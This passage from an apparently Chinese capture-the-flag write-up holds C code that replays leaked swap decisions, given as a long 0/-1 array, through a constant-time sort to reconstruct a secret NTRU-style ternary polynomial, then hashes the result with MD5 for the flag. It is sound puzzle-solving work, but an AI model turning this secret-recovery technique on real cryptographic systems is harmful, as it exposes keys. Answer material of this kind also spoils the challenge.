class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">&#125;;//<span class="keyword">from</span> <span class="built_in">print</span>(n) <span class="keyword">in</span> wp.py  </span><br><span class="line">/* assume <span class="number">2</span> &lt;= n &lt;= <span class="number">0x40000000</span> */</span><br><span class="line"><span class="built_in">int</span> count=<span class="number">0</span>;</span><br><span class="line">void great_swap(<span class="built_in">int</span>* pa,<span class="built_in">int</span>* pb)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> ab=*pa^*pb;</span><br><span class="line">    <span class="built_in">int</span> c=n[count];</span><br><span class="line">    c&amp;=ab;</span><br><span class="line">    *pa^=c;</span><br><span class="line">    *pb^=c;</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void crypto_sort_int32(int32 *array,size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  size_t top,p,q,r,i,j;</span><br><span class="line">  int32 *x = array;</span><br><span class="line"></span><br><span class="line">  top = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (top &lt; n - top) top += top;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (p = top;p &gt;= <span class="number">1</span>;p &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i + <span class="number">2</span> * p &lt;= n) &#123;</span><br><span class="line">      <span class="keyword">for</span> (j = i;j &lt; i + p;++j) &#123;</span><br><span class="line">        great_swap(&amp;x[j],&amp;x[j+p]);</span><br><span class="line">      &#125;</span><br><span class="line">      i += <span class="number">2</span> * p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (j = i;j &lt; n - p;++j) &#123;</span><br><span class="line">      great_swap(&amp;x[j],&amp;x[j+p]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (q = top;q &gt; p;q &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (j != i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">          <span class="keyword">if</span> (j == n - q) goto done;</span><br><span class="line">          int32 a = x[j + p];</span><br><span class="line">          <span class="keyword">for</span> (r = q;r &gt; p;r &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            great_swap(&amp;a,&amp;x[j + r]);</span><br><span class="line">          &#125;</span><br><span class="line">          x[j + p] = a;</span><br><span class="line">          ++j;</span><br><span class="line">          <span class="keyword">if</span> (j == i + p) &#123;</span><br><span class="line">            i += <span class="number">2</span> * p;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (i + p &lt;= n - q) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = i;j &lt; i + p;++j) &#123;</span><br><span class="line">          int32 a = x[j + p];</span><br><span class="line">          <span class="keyword">for</span> (r = q;r &gt; p;r &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            great_swap(&amp;a,&amp;x[j+r]);</span><br><span class="line">          &#125;</span><br><span class="line">          x[j + p] = a;</span><br><span class="line">        &#125;</span><br><span class="line">        i += <span class="number">2</span> * p;</span><br><span class="line">      &#125;</span><br><span class="line">      /* now i + p &gt; n - q */</span><br><span class="line">      j = i;</span><br><span class="line">      <span class="keyword">while</span> (j &lt; n - q) &#123;</span><br><span class="line">        int32 a = x[j + p];</span><br><span class="line">        <span class="keyword">for</span> (r = q;r &gt; p;r &gt;&gt;= <span class="number">1</span>) &#123;</span><br><span class="line">          great_swap(&amp;a,&amp;x[j+r]);</span><br><span class="line">        &#125;</span><br><span class="line">        x[j + p] = a;</span><br><span class="line">        ++j;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      done: ;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> sample(<span class="built_in">int</span>* a, <span class="built_in">int</span> d,<span class="built_in">int</span> N,char * ans)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> tmp[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;d+<span class="number">1</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp[i]=(a[i]&lt;&lt;<span class="number">3</span>)|<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=d+<span class="number">1</span>;i&lt;<span class="number">2</span>*d+<span class="number">1</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp[i]=(a[i]&lt;&lt;<span class="number">3</span>)|<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>*d+<span class="number">1</span>;i&lt;N;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp[i]=(a[i]&lt;&lt;<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    crypto_sort_int32(tmp,N);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        ans[i]=tmp[i]&amp;<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char ans[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">int</span> init[<span class="number">256</span>]=</span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">int</span> main(<span class="built_in">int</span> argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> N=<span class="number">251</span>,q=<span class="number">256</span>,p=<span class="number">3</span>,d=<span class="number">72</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        init[i]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sample(init,d,N,ans);</span><br><span class="line">    printf(<span class="string">&quot;\ncount:%d\n&quot;</span>,count);</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;%d,&quot;</span>,ans[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后按示例md5。</p>
